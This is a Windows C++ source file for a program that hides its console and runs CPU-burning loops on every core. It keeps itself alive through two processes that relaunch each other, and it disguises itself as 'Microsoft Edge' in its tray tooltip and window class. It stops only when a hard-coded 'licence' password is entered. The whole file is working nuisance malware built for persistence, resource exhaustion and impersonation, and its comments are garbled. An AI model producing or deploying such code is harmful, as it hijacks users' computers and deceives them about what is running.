#ifndef UNICODE
#define UNICODE
#endif
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <thread>
#include <vector>
#include <string>

#define WM_TRAYICON (WM_USER + 1)
#define ID_TRAY_EXIT 1001

#define NIM_ADD        0
#define NIM_DELETE     2
#define NIF_MESSAGE    1
#define NIF_ICON       2
#define NIF_TIP        4

// ���ޏͺ��ġ����������xȱʧ�� MY_NID �Y���w
typedef struct {
    DWORD cbSize; 
    HWND hWnd; 
    UINT uID; 
    UINT uFlags; 
    UINT uCallbackMessage;
    HICON hIcon; 
    WCHAR szTip[128]; 
    DWORD dwState; 
    DWORD dwStateMask;
    WCHAR szInfo[256]; 
    union { UINT uTimeout; UINT uVersion; } u;
    WCHAR szInfoTitle[64]; 
    DWORD dwInfoFlags;
} MY_NID;

// ���ޏͺ��ġ����������x����ָ�����
typedef BOOL(WINAPI* PFN_ShellIcon)(DWORD, MY_NID*);

#define TH32CS_SNAPPROCESS 0x00000002
typedef struct tagPROCESSENTRY32W {
    DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID; DWORD cntThreads; DWORD th32ParentProcessID; LONG pcPriClassBase;
    DWORD dwFlags; WCHAR szExeFile[MAX_PATH];
} PROCESSENTRY32W;

typedef HANDLE(WINAPI* PFN_CreateSnapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* PFN_ProcessFirst)(HANDLE, PROCESSENTRY32W*);
typedef BOOL(WINAPI* PFN_ProcessNext)(HANDLE, PROCESSENTRY32W*);

MY_NID nid = { 0 }; 
std::vector<std::thread> threads;
bool keep_running = true;
HWND hwndMain = NULL;
bool is_child = false;
const std::wstring PASSWORD = L"123456"; 

const wchar_t* MUTEX_MAIN = L"Global\\MyCpuBurnerMainMutex";
const wchar_t* MUTEX_CHILD = L"Global\\MyCpuBurnerChildMutex";

void KillAllMyInstances() {
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel) return;

    PFN_CreateSnapshot pCreateSnapshot = (PFN_CreateSnapshot)GetProcAddress(hKernel, "CreateToolhelp32Snapshot");
    PFN_ProcessFirst pProcessFirst = (PFN_ProcessFirst)GetProcAddress(hKernel, "Process32FirstW");
    PFN_ProcessNext pProcessNext = (PFN_ProcessNext)GetProcAddress(hKernel, "Process32NextW");

    if (!pCreateSnapshot || !pProcessFirst || !pProcessNext) return;

    wchar_t myPath[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, myPath, MAX_PATH);
    std::wstring myExeName = myPath;
    size_t pos = myExeName.find_last_of(L"\\/");
    if (pos != std::wstring::npos) myExeName = myExeName.substr(pos + 1);

    DWORD myPid = GetCurrentProcessId();
    HANDLE hSnapshot = pCreateSnapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (pProcessFirst(hSnapshot, &pe)) {
            do {
                if (myExeName == pe.szExeFile && pe.th32ProcessID != myPid) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
            } while (pProcessNext(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    TerminateProcess(GetCurrentProcess(), 0);
}

void watchdog() {
    while (keep_running) {
        HANDLE hTargetMutex = OpenMutexW(SYNCHRONIZE, FALSE, is_child ? MUTEX_MAIN : MUTEX_CHILD);
        if (hTargetMutex == NULL) {
            wchar_t path[MAX_PATH];
            GetModuleFileNameW(NULL, path, MAX_PATH);
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            std::wstring cmd = std::wstring(L"\"") + path + L"\"" + (is_child ? L"" : L" child");
            
            if (CreateProcessW(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        } else {
            CloseHandle(hTargetMutex);
        }
        Sleep(300); 
    }
}

BOOL CallTray(DWORD msg, MY_NID* data) {
    HMODULE hMod = LoadLibraryW(L"shell32.dll");
    if (!hMod) return FALSE;
    PFN_ShellIcon pfn = (PFN_ShellIcon)GetProcAddress(hMod, "Shell_NotifyIconW");
    return pfn ? pfn(msg, data) : FALSE;
}

LRESULT CALLBACK PasswordProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    static HWND hEdit;
    if (msg == WM_CREATE) {
        hEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_AUTOHSCROLL, 20, 20, 200, 25, hwnd, NULL, NULL, NULL);
        CreateWindowExW(0, L"BUTTON", L"OK", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 80, 60, 80, 30, hwnd, (HMENU)IDOK, NULL, NULL);
    } else if (msg == WM_COMMAND && LOWORD(wp) == IDOK) {
        wchar_t buf[128] = {0};
        GetWindowTextW(hEdit, buf, 128);
        if (std::wstring(buf) == PASSWORD) {
            DestroyWindow(hwnd);
            KillAllMyInstances();
        } else {
            MessageBoxW(hwnd, L"error", L"Error", MB_ICONERROR);
            DestroyWindow(hwnd);
        }
    } else if (msg == WM_CLOSE) {
        DestroyWindow(hwnd);
    } else {
        return DefWindowProcW(hwnd, msg, wp, lp);
    }
    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_TRAYICON && (lp == WM_RBUTTONUP || lp == WM_LBUTTONUP)) {
        HMENU hMenu = CreatePopupMenu();
        AppendMenuW(hMenu, MF_STRING, ID_TRAY_EXIT, L"Check Progress");
        POINT pt; GetCursorPos(&pt);
        SetForegroundWindow(hwnd);
        TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_BOTTOMALIGN, pt.x, pt.y, 0, hwnd, NULL);
        DestroyMenu(hMenu);
    } else if (msg == WM_COMMAND && LOWORD(wp) == ID_TRAY_EXIT) {
        WNDCLASSW wc = { 0 }; wc.lpfnWndProc = PasswordProc; wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = L"Microsoft Edge"; wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIconW(GetModuleHandle(NULL), MAKEINTRESOURCEW(1));
        RegisterClassW(&wc);
        HWND dlg = CreateWindowExW(WS_EX_TOPMOST | WS_EX_DLGMODALFRAME, L"Microsoft Edge", L"Enter Licence", WS_POPUPWINDOW | WS_CAPTION, 
            (GetSystemMetrics(SM_CXSCREEN)-260)/2, (GetSystemMetrics(SM_CYSCREEN)-140)/2, 260, 140, hwnd, NULL, GetModuleHandle(NULL), NULL);
        ShowWindow(dlg, SW_SHOW); UpdateWindow(dlg);
        
        MSG dMsg; 
        while (GetMessageW(&dMsg, NULL, 0, 0)) { 
            TranslateMessage(&dMsg); 
            DispatchMessageW(&dMsg); 
            if (!IsWindow(dlg)) break; 
        }
    } else if (msg == WM_CLOSE) {
        DestroyWindow(hwnd);
    } else if (msg == WM_DESTROY) {
        if (!is_child) CallTray(NIM_DELETE, &nid);
        keep_running = false;
        PostQuitMessage(0);
    } else {
        return DefWindowProcW(hwnd, msg, wp, lp);
    }
    return 0;
}

void cpu_burner() {
    while (keep_running) { double x = 1.2345; x = x * x; }
}

int main() {
    HWND console = GetConsoleWindow();
    if (console) ShowWindow(console, SW_HIDE);

    std::wstring cmdLine = GetCommandLineW();
    is_child = (cmdLine.find(L"child") != std::wstring::npos);

    HANDLE hMyMutex = CreateMutexW(NULL, TRUE, is_child ? MUTEX_CHILD : MUTEX_MAIN);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMyMutex);
        return 0;
    }

    std::thread(watchdog).detach();

    unsigned int cores = std::thread::hardware_concurrency();
    HINSTANCE hInst = GetModuleHandle(NULL);
    WNDCLASSW wc = { 0 }; wc.lpfnWndProc = WndProc; wc.hInstance = hInst; wc.lpszClassName = L"TrayClass";
    RegisterClassW(&wc);
    hwndMain = CreateWindowExW(0, L"TrayClass", L"", 0, 0, 0, 0, 0, NULL, NULL, hInst, NULL);

    if (!is_child) {
        nid.cbSize = sizeof(MY_NID); nid.hWnd = hwndMain; nid.uID = 1;
        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP; nid.uCallbackMessage = WM_TRAYICON;
        nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        lstrcpyW(nid.szTip, L"Microsoft Edge");
        CallTray(NIM_ADD, &nid);
    }

    for (size_t i = 0; i < cores; ++i) threads.push_back(std::thread(cpu_burner));

    MSG msg; while (GetMessageW(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }

    keep_running = false;
    for (auto &t : threads) { if (t.joinable()) t.join(); }
    CloseHandle(hMyMutex);
    return 0;
}
